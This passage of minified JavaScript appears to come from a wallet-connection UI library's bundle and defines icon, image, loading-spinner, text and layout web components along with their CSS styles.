ightBrown:"",x:"",wallet:""},KOe={"ph-arrow-circle-down":()=>pt(()=>import("./PhArrowCircleDown-BtlNV0TZ.js"),__vite__mapDeps([16,17])),"ph-arrow-clockwise":()=>pt(()=>import("./PhArrowClockwise-mOiWYLMV.js"),__vite__mapDeps([18,17])),"ph-arrow-down":()=>pt(()=>import("./PhArrowDown-CkoOD89h.js"),__vite__mapDeps([19,17])),"ph-arrow-left":()=>pt(()=>import("./PhArrowLeft-C0jlxVhM.js"),__vite__mapDeps([20,17])),"ph-arrow-right":()=>pt(()=>import("./PhArrowRight-BI-V03Xf.js"),__vite__mapDeps([21,17])),"ph-arrow-square-out":()=>pt(()=>import("./PhArrowSquareOut-DnQ7n_B4.js"),__vite__mapDeps([22,17])),"ph-arrows-down-up":()=>pt(()=>import("./PhArrowsDownUp-PZosTqZG.js"),__vite__mapDeps([23,17])),"ph-arrows-left-right":()=>pt(()=>import("./PhArrowsLeftRight-CYsRQ2qh.js"),__vite__mapDeps([24,17])),"ph-arrow-up":()=>pt(()=>import("./PhArrowUp-izKvURUW.js"),__vite__mapDeps([25,17])),"ph-arrow-up-right":()=>pt(()=>import("./PhArrowUpRight-Bn-JhHsY.js"),__vite__mapDeps([26,17])),"ph-arrows-clockwise":()=>pt(()=>import("./PhArrowsClockwise-Brtx2Re-.js"),__vite__mapDeps([27,17])),"ph-bank":()=>pt(()=>import("./PhBank-hhPAIPVb.js"),__vite__mapDeps([28,17])),"ph-browser":()=>pt(()=>import("./PhBrowser-BjzAmrHO.js"),__vite__mapDeps([29,17])),"ph-caret-down":()=>pt(()=>import("./PhCaretDown-ddSjwcwm.js"),__vite__mapDeps([30,17])),"ph-caret-left":()=>pt(()=>import("./PhCaretLeft-B7YLoNEF.js"),__vite__mapDeps([31,17])),"ph-caret-right":()=>pt(()=>import("./PhCaretRight-BY8D5MIg.js"),__vite__mapDeps([32,17])),"ph-caret-up":()=>pt(()=>import("./PhCaretUp-BG10nSut.js"),__vite__mapDeps([33,17])),"ph-check":()=>pt(()=>import("./PhCheck-DrKd7pBC.js"),__vite__mapDeps([34,17])),"ph-circle-half":()=>pt(()=>import("./PhCircleHalf-Bk9C4DvT.js"),__vite__mapDeps([35,17])),"ph-clock":()=>pt(()=>import("./PhClock-Sj17weCB.js"),__vite__mapDeps([36,17])),"ph-compass":()=>pt(()=>import("./PhCompass-Df1ugFO-.js"),__vite__mapDeps([37,17])),"ph-copy":()=>pt(()=>import("./PhCopy-rgttky8E.js"),__vite__mapDeps([38,17])),"ph-credit-card":()=>pt(()=>import("./PhCreditCard-CZpdid2n.js"),__vite__mapDeps([39,17])),"ph-currency-dollar":()=>pt(()=>import("./PhCurrencyDollar-B6IKKjue.js"),__vite__mapDeps([40,17])),"ph-desktop":()=>pt(()=>import("./PhDesktop-BuCDXYJj.js"),__vite__mapDeps([41,17])),"ph-device-mobile":()=>pt(()=>import("./PhDeviceMobile-CnybhXY-.js"),__vite__mapDeps([42,17])),"ph-dots-three":()=>pt(()=>import("./PhDotsThree-CSAEcba1.js"),__vite__mapDeps([43,17])),"ph-vault":()=>pt(()=>import("./PhVault-B8m1usHw.js"),__vite__mapDeps([44,17])),"ph-envelope":()=>pt(()=>import("./PhEnvelope-SmaNeXoQ.js"),__vite__mapDeps([45,17])),"ph-funnel-simple":()=>pt(()=>import("./PhFunnelSimple-DKx35ITq.js"),__vite__mapDeps([46,17])),"ph-globe":()=>pt(()=>import("./PhGlobe-q1mqj65V.js"),__vite__mapDeps([47,17])),"ph-identification-card":()=>pt(()=>import("./PhIdentificationCard-BeLXJpfZ.js"),__vite__mapDeps([48,17])),"ph-image":()=>pt(()=>import("./PhImage-BYrKfN9k.js"),__vite__mapDeps([49,17])),"ph-info":()=>pt(()=>import("./PhInfo-X33f06Ej.js"),__vite__mapDeps([50,17])),"ph-lightbulb":()=>pt(()=>import("./PhLightbulb-DMZJsowR.js"),__vite__mapDeps([51,17])),"ph-magnifying-glass":()=>pt(()=>import("./PhMagnifyingGlass-B6D0sWFL.js"),__vite__mapDeps([52,17])),"ph-paper-plane-right":()=>pt(()=>import("./PhPaperPlaneRight-Dvo-nXr9.js"),__vite__mapDeps([53,17])),"ph-plus":()=>pt(()=>import("./PhPlus-CBvZvLax.js"),__vite__mapDeps([54,17])),"ph-power":()=>pt(()=>import("./PhPower-D8-AcNM6.js"),__vite__mapDeps([55,17])),"ph-puzzle-piece":()=>pt(()=>import("./PhPuzzlePiece-C-7mYqGO.js"),__vite__mapDeps([56,17])),"ph-qr-code":()=>pt(()=>import("./PhQrCode-uIXlI5ER.js"),__vite__mapDeps([57,17])),"ph-question":()=>pt(()=>import("./PhQuestion-rUoqC2sC.js"),__vite__mapDeps([58,17])),"ph-question-circle":()=>pt(()=>import("./PhQuestionMark-W55Txvvb.js"),__vite__mapDeps([59,17])),"ph-seal-check":()=>pt(()=>import("./PhSealCheck-BeVLq9PH.js"),__vite__mapDeps([60,17])),"ph-sign-out":()=>pt(()=>import("./PhSignOut-Cq2PivQ6.js"),__vite__mapDeps([61,17])),"ph-spinner":()=>pt(()=>import("./PhSpinner-CZMtAFdX.js"),__vite__mapDeps([62,17])),"ph-trash":()=>pt(()=>import("./PhTrash-BamrmMsN.js"),__vite__mapDeps([63,17])),"ph-user":()=>pt(()=>import("./PhUser-A2fxqIV0.js"),__vite__mapDeps([64,17])),"ph-warning":()=>pt(()=>import("./PhWarning-CpkID9oi.js"),__vite__mapDeps([65,17])),"ph-warning-circle":()=>pt(()=>import("./PhWarningCircle-Cm58gXb9.js"),__vite__mapDeps([66,17])),"ph-x":()=>pt(()=>import("./PhX-C3b4cCEy.js"),__vite__mapDeps([67,17]))},ZOe={appStore:AOe,apple:COe,bitcoin:SOe,chromeStore:TOe,cursor:xOe,discord:IOe,ethereum:ROe,etherscan:POe,facebook:NOe,farcaster:OOe,github:kOe,google:DOe,playStore:BOe,reown:jOe,solana:MOe,ton:Nae,telegram:UOe,twitch:LOe,twitter:lW,twitterIcon:FOe,walletConnect:HOe,walletConnectInvert:zOe,walletConnectBrown:VOe,walletConnectLightBrown:qOe,x:lW,wallet:$Oe},YOe={"accent-primary":oi.tokens.core.iconAccentPrimary,"accent-certified":oi.tokens.core.iconAccentCertified,default:oi.tokens.theme.iconDefault,success:oi.tokens.core.iconSuccess,error:oi.tokens.core.iconError,warning:oi.tokens.core.iconWarning,inverse:oi.tokens.theme.iconInverse};let dg=class extends $e{constructor(){super(...arguments),this.size="md",this.name="copy",this.weight="bold",this.color="inherit"}render(){const e={xxs:"2",xs:"3",sm:"3",md:"4",mdl:"5",lg:"5",xl:"6",xxl:"7",inherit:"inherit"};this.style.cssText=`
      --local-width: ${this.size==="inherit"?"inherit":`var(--apkt-spacing-${e[this.size]})`};
      --local-color: ${this.color==="inherit"?"inherit":YOe[this.color]}
    `;const n=GOe[this.name];if(n&&n!==""){const r=KOe[n];r&&r();const i=EOe(n);return uW`<${i} size=${{xxs:"0.5em",xs:"0.75em",sm:"0.75em",md:"1em",mdl:"1.25em",lg:"1.25em",xl:"1.5em",xxl:"1.75em"}[this.size]} weight="${this.weight}"></${i}>`}return ZOe[this.name]||uW``}};dg.styles=[Dt,WOe];oA([ie()],dg.prototype,"size",void 0);oA([ie()],dg.prototype,"name",void 0);oA([ie()],dg.prototype,"weight",void 0);oA([ie()],dg.prototype,"color",void 0);dg=oA([Ue("wui-icon")],dg);const QOe=ot`
  :host {
    display: block;
    width: var(--local-width);
    height: var(--local-height);
  }

  img {
    display: block;
    width: 100%;
    height: 100%;
    object-fit: cover;
    object-position: center center;
    border-radius: inherit;
    user-select: none;
    user-drag: none;
    -webkit-user-drag: none;
    -khtml-user-drag: none;
    -moz-user-drag: none;
    -o-user-drag: none;
  }

  :host([data-boxed='true']) {
    width: 40px;
    height: 40px;
    display: flex;
    align-items: center;
    justify-content: center;
    background-color: ${({tokens:t})=>t.theme.foregroundPrimary};
    border-radius: ${({borderRadius:t})=>t[2]};
  }

  :host([data-boxed='true']) img {
    width: 20px;
    height: 20px;
    border-radius: ${({borderRadius:t})=>t[16]};
  }

  :host([data-full='true']) img {
    width: 100%;
    height: 100%;
  }

  :host([data-boxed='true']) wui-icon {
    width: 20px;
    height: 20px;
  }

  :host([data-icon='error']) {
    background-color: ${({tokens:t})=>t.core.backgroundError};
  }

  :host([data-rounded='true']) {
    border-radius: ${({borderRadius:t})=>t[16]};
  }
`;var id=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let $c=class extends $e{constructor(){super(...arguments),this.src="./path/to/image.jpg",this.alt="Image",this.size=void 0,this.boxed=!1,this.rounded=!1,this.fullSize=!1}render(){const e={inherit:"inherit",xxs:"2",xs:"3",sm:"4",md:"4",mdl:"5",lg:"5",xl:"6",xxl:"7","3xl":"8","4xl":"9","5xl":"10"};return this.style.cssText=`
      --local-width: ${this.size?`var(--apkt-spacing-${e[this.size]});`:"100%"};
      --local-height: ${this.size?`var(--apkt-spacing-${e[this.size]});`:"100%"};
      `,this.dataset.boxed=this.boxed?"true":"false",this.dataset.rounded=this.rounded?"true":"false",this.dataset.full=this.fullSize?"true":"false",this.dataset.icon=this.iconColor||"inherit",this.icon?X`<wui-icon
        color=${this.iconColor||"inherit"}
        name=${this.icon}
        size="lg"
      ></wui-icon> `:this.logo?X`<wui-icon size="lg" color="inherit" name=${this.logo}></wui-icon> `:X`<img src=${et(this.src)} alt=${this.alt} @error=${this.handleImageError} />`}handleImageError(){this.dispatchEvent(new CustomEvent("onLoadError",{bubbles:!0,composed:!0}))}};$c.styles=[Dt,QOe];id([ie()],$c.prototype,"src",void 0);id([ie()],$c.prototype,"logo",void 0);id([ie()],$c.prototype,"icon",void 0);id([ie()],$c.prototype,"iconColor",void 0);id([ie()],$c.prototype,"alt",void 0);id([ie()],$c.prototype,"size",void 0);id([ie({type:Boolean})],$c.prototype,"boxed",void 0);id([ie({type:Boolean})],$c.prototype,"rounded",void 0);id([ie({type:Boolean})],$c.prototype,"fullSize",void 0);$c=id([Ue("wui-image")],$c);const JOe=mr`
  :host {
    display: flex;
  }

  :host([data-size='sm']) > svg {
    width: 12px;
    height: 12px;
  }

  :host([data-size='md']) > svg {
    width: 16px;
    height: 16px;
  }

  :host([data-size='lg']) > svg {
    width: 24px;
    height: 24px;
  }

  :host([data-size='xl']) > svg {
    width: 32px;
    height: 32px;
  }

  svg {
    animation: rotate 1.4s linear infinite;
    color: var(--local-color);
  }

  :host([data-size='md']) > svg > circle {
    stroke-width: 6px;
  }

  :host([data-size='sm']) > svg > circle {
    stroke-width: 8px;
  }

  @keyframes rotate {
    100% {
      transform: rotate(360deg);
    }
  }
`;var QB=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let p_=class extends $e{constructor(){super(...arguments),this.color="primary",this.size="lg"}render(){const e={primary:oi.tokens.theme.textPrimary,secondary:oi.tokens.theme.textSecondary,tertiary:oi.tokens.theme.textTertiary,invert:oi.tokens.theme.textInvert,error:oi.tokens.core.textError,warning:oi.tokens.core.textWarning,"accent-primary":oi.tokens.core.textAccentPrimary};return this.style.cssText=`
      --local-color: ${this.color==="inherit"?"inherit":e[this.color]};
      `,this.dataset.size=this.size,X`<svg viewBox="0 0 16 17" fill="none">
      <path
        d="M8.75 2.65625V4.65625C8.75 4.85516 8.67098 5.04593 8.53033 5.18658C8.38968 5.32723 8.19891 5.40625 8 5.40625C7.80109 5.40625 7.61032 5.32723 7.46967 5.18658C7.32902 5.04593 7.25 4.85516 7.25 4.65625V2.65625C7.25 2.45734 7.32902 2.26657 7.46967 2.12592C7.61032 1.98527 7.80109 1.90625 8 1.90625C8.19891 1.90625 8.38968 1.98527 8.53033 2.12592C8.67098 2.26657 8.75 2.45734 8.75 2.65625ZM14 7.90625H12C11.8011 7.90625 11.6103 7.98527 11.4697 8.12592C11.329 8.26657 11.25 8.45734 11.25 8.65625C11.25 8.85516 11.329 9.04593 11.4697 9.18658C11.6103 9.32723 11.8011 9.40625 12 9.40625H14C14.1989 9.40625 14.3897 9.32723 14.5303 9.18658C14.671 9.04593 14.75 8.85516 14.75 8.65625C14.75 8.45734 14.671 8.26657 14.5303 8.12592C14.3897 7.98527 14.1989 7.90625 14 7.90625ZM11.3588 10.9544C11.289 10.8846 11.2062 10.8293 11.115 10.7915C11.0239 10.7538 10.9262 10.7343 10.8275 10.7343C10.7288 10.7343 10.6311 10.7538 10.54 10.7915C10.4488 10.8293 10.366 10.8846 10.2963 10.9544C10.2265 11.0241 10.1711 11.107 10.1334 11.1981C10.0956 11.2893 10.0762 11.387 10.0762 11.4856C10.0762 11.5843 10.0956 11.682 10.1334 11.7731C10.1711 11.8643 10.2265 11.9471 10.2963 12.0169L11.7106 13.4312C11.8515 13.5721 12.0426 13.6513 12.2419 13.6513C12.4411 13.6513 12.6322 13.5721 12.7731 13.4312C12.914 13.2904 12.9932 13.0993 12.9932 12.9C12.9932 12.7007 12.914 12.5096 12.7731 12.3687L11.3588 10.9544ZM8 11.9062C7.80109 11.9062 7.61032 11.9853 7.46967 12.1259C7.32902 12.2666 7.25 12.4573 7.25 12.6562V14.6562C7.25 14.8552 7.32902 15.0459 7.46967 15.1866C7.61032 15.3272 7.80109 15.4062 8 15.4062C8.19891 15.4062 8.38968 15.3272 8.53033 15.1866C8.67098 15.0459 8.75 14.8552 8.75 14.6562V12.6562C8.75 12.4573 8.67098 12.2666 8.53033 12.1259C8.38968 11.9853 8.19891 11.9062 8 11.9062ZM4.64125 10.9544L3.22688 12.3687C3.08598 12.5096 3.00682 12.7007 3.00682 12.9C3.00682 13.0993 3.08598 13.2904 3.22688 13.4312C3.36777 13.5721 3.55887 13.6513 3.75813 13.6513C3.95738 13.6513 4.14848 13.5721 4.28937 13.4312L5.70375 12.0169C5.84465 11.876 5.9238 11.6849 5.9238 11.4856C5.9238 11.2864 5.84465 11.0953 5.70375 10.9544C5.56285 10.8135 5.37176 10.7343 5.1725 10.7343C4.97324 10.7343 4.78215 10.8135 4.64125 10.9544ZM4.75 8.65625C4.75 8.45734 4.67098 8.26657 4.53033 8.12592C4.38968 7.98527 4.19891 7.90625 4 7.90625H2C1.80109 7.90625 1.61032 7.98527 1.46967 8.12592C1.32902 8.26657 1.25 8.45734 1.25 8.65625C1.25 8.85516 1.32902 9.04593 1.46967 9.18658C1.61032 9.32723 1.80109 9.40625 2 9.40625H4C4.19891 9.40625 4.38968 9.32723 4.53033 9.18658C4.67098 9.04593 4.75 8.85516 4.75 8.65625ZM4.2875 3.88313C4.1466 3.74223 3.95551 3.66307 3.75625 3.66307C3.55699 3.66307 3.3659 3.74223 3.225 3.88313C3.0841 4.02402 3.00495 4.21512 3.00495 4.41438C3.00495 4.61363 3.0841 4.80473 3.225 4.94562L4.64125 6.35813C4.78215 6.49902 4.97324 6.57818 5.1725 6.57818C5.37176 6.57818 5.56285 6.49902 5.70375 6.35813C5.84465 6.21723 5.9238 6.02613 5.9238 5.82688C5.9238 5.62762 5.84465 5.43652 5.70375 5.29563L4.2875 3.88313Z"
        fill="currentColor"
      />
    </svg>`}};p_.styles=[Dt,JOe];QB([ie()],p_.prototype,"color",void 0);QB([ie()],p_.prototype,"size",void 0);p_=QB([Ue("wui-loading-spinner")],p_);const Oae={ATTRIBUTE:1,CHILD:2},kae=t=>(...e)=>({_$litDirective$:t,values:e});class Dae{constructor(e){}get _$AU(){return this._$AM._$AU}_$AT(e,n,r){this._$Ct=e,this._$AM=n,this._$Ci=r}_$AS(e,n){return this.update(e,n)}update(e,n){return this.render(...n)}}const JB=kae(class extends Dae{constructor(t){if(super(t),t.type!==Oae.ATTRIBUTE||t.name!=="class"||t.strings?.length>2)throw Error("`classMap()` can only be used in the `class` attribute and must be the only part in the attribute.")}render(t){return" "+Object.keys(t).filter((e=>t[e])).join(" ")+" "}update(t,[e]){if(this.st===void 0){this.st=new Set,t.strings!==void 0&&(this.nt=new Set(t.strings.join(" ").split(/\s/).filter((r=>r!==""))));for(const r in e)e[r]&&!this.nt?.has(r)&&this.st.add(r);return this.render(e)}const n=t.element.classList;for(const r of this.st)r in e||(n.remove(r),this.st.delete(r));for(const r in e){const i=!!e[r];i===this.st.has(r)||this.nt?.has(r)||(i?(n.add(r),this.st.add(r)):(n.remove(r),this.st.delete(r)))}return lg}}),XOe=ot`
  slot {
    width: 100%;
    display: inline-block;
    font-style: normal;
    overflow: inherit;
    text-overflow: inherit;
    text-align: var(--local-align);
    color: var(--local-color);
  }

  .wui-line-clamp-1 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 1;
  }

  .wui-line-clamp-2 {
    overflow: hidden;
    display: -webkit-box;
    -webkit-box-orient: vertical;
    -webkit-line-clamp: 2;
  }

  /* -- Headings --------------------------------------------------- */
  .wui-font-h1-regular-mono {
    font-size: ${({textSize:t})=>t.h1};
    line-height: ${({typography:t})=>t["h1-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h1-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h1-regular {
    font-size: ${({textSize:t})=>t.h1};
    line-height: ${({typography:t})=>t["h1-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h1-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h1-medium {
    font-size: ${({textSize:t})=>t.h1};
    line-height: ${({typography:t})=>t["h1-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h1-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h2-regular-mono {
    font-size: ${({textSize:t})=>t.h2};
    line-height: ${({typography:t})=>t["h2-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h2-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h2-regular {
    font-size: ${({textSize:t})=>t.h2};
    line-height: ${({typography:t})=>t["h2-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h2-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h2-medium {
    font-size: ${({textSize:t})=>t.h2};
    line-height: ${({typography:t})=>t["h2-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h2-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h3-regular-mono {
    font-size: ${({textSize:t})=>t.h3};
    line-height: ${({typography:t})=>t["h3-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h3-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h3-regular {
    font-size: ${({textSize:t})=>t.h3};
    line-height: ${({typography:t})=>t["h3-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h3-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h3-medium {
    font-size: ${({textSize:t})=>t.h3};
    line-height: ${({typography:t})=>t["h3-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h3-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h4-regular-mono {
    font-size: ${({textSize:t})=>t.h4};
    line-height: ${({typography:t})=>t["h4-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h4-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h4-regular {
    font-size: ${({textSize:t})=>t.h4};
    line-height: ${({typography:t})=>t["h4-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h4-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h4-medium {
    font-size: ${({textSize:t})=>t.h4};
    line-height: ${({typography:t})=>t["h4-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h4-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h5-regular-mono {
    font-size: ${({textSize:t})=>t.h5};
    line-height: ${({typography:t})=>t["h5-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h5-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h5-regular {
    font-size: ${({textSize:t})=>t.h5};
    line-height: ${({typography:t})=>t["h5-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h5-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h5-medium {
    font-size: ${({textSize:t})=>t.h5};
    line-height: ${({typography:t})=>t["h5-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h5-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h6-regular-mono {
    font-size: ${({textSize:t})=>t.h6};
    line-height: ${({typography:t})=>t["h6-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h6-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-h6-regular {
    font-size: ${({textSize:t})=>t.h6};
    line-height: ${({typography:t})=>t["h6-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h6-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-h6-medium {
    font-size: ${({textSize:t})=>t.h6};
    line-height: ${({typography:t})=>t["h6-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["h6-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-lg-regular-mono {
    font-size: ${({textSize:t})=>t.large};
    line-height: ${({typography:t})=>t["lg-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["lg-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-lg-regular {
    font-size: ${({textSize:t})=>t.large};
    line-height: ${({typography:t})=>t["lg-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["lg-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-lg-medium {
    font-size: ${({textSize:t})=>t.large};
    line-height: ${({typography:t})=>t["lg-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["lg-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-md-regular-mono {
    font-size: ${({textSize:t})=>t.medium};
    line-height: ${({typography:t})=>t["md-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["md-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-md-regular {
    font-size: ${({textSize:t})=>t.medium};
    line-height: ${({typography:t})=>t["md-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["md-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-md-medium {
    font-size: ${({textSize:t})=>t.medium};
    line-height: ${({typography:t})=>t["md-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["md-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-sm-regular-mono {
    font-size: ${({textSize:t})=>t.small};
    line-height: ${({typography:t})=>t["sm-regular-mono"].lineHeight};
    letter-spacing: ${({typography:t})=>t["sm-regular-mono"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.mono};
  }

  .wui-font-sm-regular {
    font-size: ${({textSize:t})=>t.small};
    line-height: ${({typography:t})=>t["sm-regular"].lineHeight};
    letter-spacing: ${({typography:t})=>t["sm-regular"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.regular};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }

  .wui-font-sm-medium {
    font-size: ${({textSize:t})=>t.small};
    line-height: ${({typography:t})=>t["sm-medium"].lineHeight};
    letter-spacing: ${({typography:t})=>t["sm-medium"].letterSpacing};
    font-weight: ${({fontWeight:t})=>t.medium};
    font-family: ${({fontFamily:t})=>t.regular};
    font-feature-settings:
      'liga' off,
      'clig' off;
  }
`;var ow=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};const eke={primary:oi.tokens.theme.textPrimary,secondary:oi.tokens.theme.textSecondary,tertiary:oi.tokens.theme.textTertiary,invert:oi.tokens.theme.textInvert,error:oi.tokens.core.textError,warning:oi.tokens.core.textWarning,"accent-primary":oi.tokens.core.textAccentPrimary};let kp=class extends $e{constructor(){super(...arguments),this.variant="md-regular",this.color="inherit",this.align="left",this.lineClamp=void 0,this.display="inline-flex"}render(){const e={[`wui-font-${this.variant}`]:!0,[`wui-line-clamp-${this.lineClamp}`]:!!this.lineClamp};return this.style.cssText=`
      display: ${this.display};
      --local-align: ${this.align};
      --local-color: ${this.color==="inherit"?"inherit":eke[this.color??"primary"]};
      `,X`<slot class=${JB(e)}></slot>`}};kp.styles=[Dt,XOe];ow([ie()],kp.prototype,"variant",void 0);ow([ie()],kp.prototype,"color",void 0);ow([ie()],kp.prototype,"align",void 0);ow([ie()],kp.prototype,"lineClamp",void 0);ow([ie()],kp.prototype,"display",void 0);kp=ow([Ue("wui-text")],kp);const tke=mr`
  :host {
    display: flex;
    width: inherit;
    height: inherit;
    box-sizing: border-box;
  }
`;var ua=function(t,e,n,r){var i=arguments.length,s=i<3?e:r===null?r=Object.getOwnPropertyDescriptor(e,n):r,o;if(typeof Reflect=="object"&&typeof Reflect.decorate=="function")s=Reflect.decorate(t,e,n,r);else for(var a=t.length-1;a>=0;a--)(o=t[a])&&(s=(i<3?o(s):i>3?o(e,n,s):o(e,n))||s);return i>3&&s&&Object.defineProperty(e,n,s),s};let Zs=class extends $e{render(){return this.style.cssText=`
      flex-direction: ${this.flexDirection};
      flex-wrap: ${this.flexWrap};
      flex-basis: ${this.flexBasis};
      flex-grow: ${this.flexGrow};
      flex-shrink: ${this.flexShrink};
      align-items: ${this.alignItems};
      justify-content: ${this.justifyContent};
      column-gap: ${this.columnGap&&`var(--apkt-spacing-${this.columnGap})`};
      row-gap: ${this.rowGap&&`var(--apkt-spacing-${this.rowGap})`};
      gap: ${this.gap&&`var(--apkt-spacing-${this.gap})`};
      padding-top: ${this.padding&&Cr.getSpacingStyles(this.padding,0)};
      padding-right: ${this.padding&&Cr.getSpacingStyles(this.padding,1)};
      padding-bottom: ${this.padding&&Cr.getSpacingStyles(this.padding,2)};
      padding-left: ${this.padding&&Cr.getSpacingStyles(this.padding,3)};
      margin-top: ${this.margin&&Cr.getSpacingStyles(this.margin,0)};
      margin-right: ${this.margin&&Cr.getSpacingStyles(this.margin,1)};
      margin-bottom: ${this.margin&&Cr.getSpacingStyles(this.margin,2)};
      margin-left: ${this.margin&&Cr.getSpacingStyles(this.margin,3)};
      width: ${this.width};
